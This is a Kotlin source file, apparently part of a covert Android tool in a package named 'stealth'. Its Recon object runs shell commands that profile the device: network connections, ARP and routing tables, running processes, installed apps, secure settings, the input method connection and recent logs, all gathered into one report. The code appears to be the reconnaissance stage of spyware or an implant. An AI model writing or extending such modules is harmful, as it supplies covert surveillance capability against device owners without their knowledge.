package com.kaze.stealth

import android.content.Context

object Recon {

    fun execute(context: Context): String {
        val sb = StringBuilder()

        sb.append("=== SYSTEM PROPERTIES ===\n")
        sb.append(Commands.shell("getprop")).append("\n")

        sb.append("=== KERNEL ===\n")
        sb.append(Commands.shell("cat /proc/version")).append("\n")

        sb.append("=== CPU ===\n")
        sb.append(Commands.shell("cat /proc/cpuinfo | head -30")).append("\n")

        sb.append("=== MEMORY ===\n")
        sb.append(Commands.shell("cat /proc/meminfo | head -15")).append("\n")

        sb.append("=== NETWORK INTERFACES ===\n")
        sb.append(Commands.shell("ip addr show")).append("\n")

        sb.append("=== TCP CONNECTIONS ===\n")
        sb.append(Commands.shell("cat /proc/net/tcp")).append("\n")

        sb.append("=== ARP TABLE ===\n")
        sb.append(Commands.shell("cat /proc/net/arp")).append("\n")

        sb.append("=== ROUTING TABLE ===\n")
        sb.append(Commands.shell("ip route show")).append("\n")

        sb.append("=== RUNNING PROCESSES ===\n")
        sb.append(Commands.shell("ps -A")).append("\n")

        sb.append("=== BATTERY ===\n")
        sb.append(Commands.shell("dumpsys battery")).append("\n")

        sb.append("=== WIFI STATE ===\n")
        sb.append(Commands.shell("dumpsys wifi")).append("\n")

        sb.append("=== CONNECTIVITY ===\n")
        sb.append(Commands.shell("dumpsys connectivity")).append("\n")

        sb.append("=== THIRD-PARTY APPS ===\n")
        sb.append(Commands.shell("pm list packages -3")).append("\n")

        sb.append("=== SECURE SETTINGS ===\n")
        sb.append(Commands.shell("settings list secure")).append("\n")

        sb.append("=== GLOBAL SETTINGS ===\n")
        sb.append(Commands.shell("settings list global")).append("\n")

        sb.append("=== INPUT METHOD ===\n")
        sb.append(Commands.shell("dumpsys input_method | grep mServedInputConnection")).append("\n")

        sb.append("=== RECENT LOGS ===\n")
        sb.append(Commands.shell("logcat -d -t 50 *:W")).append("\n")

        sb.append("=== STORAGE ===\n")
        sb.append(Commands.shell("df -h /data /sdcard")).append("\n")

        sb.append("=== TIMEZONE ===\n")
        sb.append(Commands.shell("getprop persist.sys.timezone")).append("\n")

        sb.append("=== LOCALE ===\n")
        sb.append(Commands.shell("getprop persist.sys.locale")).append("\n")

        return sb.toString()
    }
}
